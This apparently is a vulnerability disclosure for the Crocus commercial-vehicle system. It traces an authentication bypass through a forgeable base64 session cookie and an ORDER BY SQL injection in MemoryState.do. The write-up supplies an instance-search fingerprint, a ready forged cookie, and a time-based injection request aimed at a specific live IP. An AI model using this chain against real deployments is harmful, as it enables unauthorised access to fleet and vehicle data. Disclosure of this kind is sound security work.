# SQL Injection Vulnerability in the MemoryState.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.

### SQL Injection Vulnerability
Since the target system uses MyBatis, we only need to search globally for `${` to find overlooked vulnerabilities.

```xml
<select id="getLastMemoryStateItems" resultType="MemoryStateInfo" parameterType="HashMap">
		select b.vehicleid,carlicense,deviceno,deviceType,b.identification,b.username,b.repairstate,b.userstate,a.chipcode,a.type,a.serialnumber,a.powerduration,a.faultnumber,a.healtstate,a.remainingtime,a.totlesize,a.remainingcapacity,a.faultdetail,a.datetime,groupname,
		e.faultcount as faulttotal, e.firstfaulttime
		from last_memorylist as a inner join vehicledeviceinfo as b on a.chipcode=b.chipcode inner join groupinfo as c on b.groupid=c.groupid left JOIN memorylistfirstfault as e on a.serialnumber = e.serialnumber and e.serialnumber != ''
		<where>
			<if test="vehicleIdList.size()>0">
				b.vehicleId in 
				<foreach collection="vehicleIdList" item="vehicleId" separator="," open="(" close=")">
					#{vehicleId}
				</foreach>
			</if>
			<if test="repairState!=null and repairState!='-1'.toString()">
  				and b.repairstate=#{repairState}
  			</if>
  			 <if test="userNameList!=null and userNameList.size()>0">	
	   			and b.userName in
	  			<foreach collection="userNameList" item="userName" separator="," open="(" close=")">
	  				#{userName}
	  			</foreach>
	  		</if>	
			<if test="field==null and value!=null">
  				and (b.chipcode like concat('%',#{value},'%') or b.carlicense like concat('%',#{value},'%') 
  				or b.deviceno like concat('%',#{value},'%') or b.devicetype like concat('%',#{value},'%')
  				or b.identification like concat('%',#{value},'%'))
  			</if>
  			<if test="field!=null and value!=null">
  				and b.${field} like concat('%',#{value},'%')
  			</if>
			<if test="healtState!=-1">
				and a.healtstate=#{healtState}
			</if>
			<if test="type!=null and type!=''">
				and a.type=#{type}
			</if>
			<if test="firstFaultTime!=null and firstFaultTime!=''">
				and e.firstfaulttime&lt;=#{firstFaultTime}
			</if>
			<if test="faultTotal!=null and faultTotal!=''">
				and e.faultcount&gt;=#{faultTotal}
			</if>
		</where>
		<if test="sortField!=null">
			 order by ${sortField}
			 <if test="sortType=='desc'">
			 	desc 
			 </if> 
		</if>
		<if test="start > -1 and end > -1">
			limit #{start},#{end}
		</if>		
	</select>
```
<img width="2305" height="1449" alt="image" src="https://github.com/user-attachments/assets/c58ac430-a204-4be3-8fc9-3c5db3fbe665" />

This is a typical **ORDER BY injection** vulnerability.

We traced back to find the source point, which is located in `streamax.saffron.controller.operationstate.MemoryStateController#query`:
```java
 @RequestMapping(params = {"Action=Query"})
    @ResponseBody
    public Object query(HttpServletRequest request) {
        String vehicleId = request.getParameter("VehicleId");
        String groupId = request.getParameter("GroupId");
        String field = request.getParameter("Field");
        String value = request.getParameter("Value");
        String healtStateStr = request.getParameter("HealthState");
        String startStr = request.getParameter("StartTime");
        String endStr = request.getParameter("EndTime");
        String pageIndex = request.getParameter("PageIndex");
        String pageSize = request.getParameter("PageSize");
        String type = request.getParameter("Type");
        String firstFaultTimeStr = request.getParameter("FirstFaultTime");
        String faultTotal = request.getParameter("FaultTotal");
        String repairState = request.getParameter("RepairState");
        String userName = request.getParameter("UserName");
        String sortField = request.getParameter("orderField");
        String sortType = request.getParameter("orderType");
        int page = new Integer(pageIndex).intValue();
        int rows = new Integer(pageSize).intValue();
        int code = 200;
        int recordCount = 0;
        List<MemoryStateInfo> list = new ArrayList<>();
        int healtState = -1;
        if (healtStateStr != null) {
            try {
                if (!healtStateStr.equals("")) {
                    healtState = new Integer(healtStateStr).intValue();
                }
            } catch (Exception e) {
                code = 202;
                CommonFunction.writeExceptionLog("MemoryState", e);
            }
        }
        new ArrayList();
        List<Integer> vehicleIdList = new ArrayList<>();
        if (CommonFunction.validate(groupId) && CommonFunction.stringToIntegerList(groupId).contains(1)) {
            vehicleIdList = new ArrayList<>();
        } else {
            if (groupId != null && !groupId.isEmpty()) {
                List<Integer> groupIdList = this.service.getAllChildrenGroupId(CommonFunction.stringToIntegerList(groupId));
                vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList));
            }
            if (vehicleId != null && !vehicleId.isEmpty()) {
                vehicleIdList.addAll(CommonFunction.stringToIntegerList(vehicleId));
            }
            if ((groupId == null || groupId.isEmpty()) && (vehicleId == null || vehicleId.isEmpty())) {
                String uID = CommonFunction.getCookieInfo(request, "UID");
                List<Integer> groupIdList2 = this.service.getUserAllGroupId(Integer.parseInt(uID));
                vehicleIdList.addAll(this.service.getAllVehicleId(groupIdList2));
            }
            if (vehicleIdList == null || vehicleIdList.size() < 1) {
                return CommonFunction.createResultMap(200, 0, new ArrayList());
            }
        }
        List<String> userNameList = new ArrayList<>();
        if (userName != null && !userName.isEmpty()) {
            for (String str : userName.split(",")) {
                userNameList.add(str);
            }
        }
        Date firstFaultTime = null;
        if (firstFaultTimeStr != null && !firstFaultTimeStr.isEmpty()) {
            firstFaultTime = this.sdf.parse(firstFaultTimeStr);
        }
        Date startTime = null;
        if (startStr != null && !startStr.equals("")) {
            startTime = this.sdf.parse(startStr);
        }
        Date endTime = null;
        if (endStr != null && !endStr.equals("")) {
            endTime = this.sdf.parse(endStr);
        }
        recordCount = this.service.getLastMemoryStateRecordCount(vehicleIdList, field, value, healtState, type, firstFaultTime, faultTotal, startTime, endTime, repairState, userNameList);
        list = this.service.getLastMemoryStateItems(vehicleIdList, field, value, healtState, type, firstFaultTime, faultTotal, startTime, endTime, repairState, userNameList, sortField, sortType, page, rows);
        return CommonFunction.createResultMap(code, recordCount, list);
    }
```
<img width="2385" height="1260" alt="image" src="https://github.com/user-attachments/assets/f3c73bf5-38ef-4aa3-9e72-39815adce813" />

<img width="1974" height="1308" alt="image" src="https://github.com/user-attachments/assets/6ef2c274-56de-41a5-ad5a-82d6ef30b9f9" />

The parameters are controllable by the user. Based on this, we constructed the following Proof of Concept (POC):

```
POST http://91.235.247.177:8000/MemoryState.do?Action=Query HTTP/1.1
Host: 91.235.247.177:8000
Content-Length: 163
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: application/x-www-form-urlencoded

EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(6))a)&orderType=asc
```
<img width="1941" height="960" alt="image" src="https://github.com/user-attachments/assets/33ca83ee-d4d8-4828-8ddc-b28556fbffe1" />

The successful 6-second delay confirms that the `MemoryState.do?Action=Query` interface has an SQL injection vulnerability.

Thank you for your review! Wish you a pleasant life!
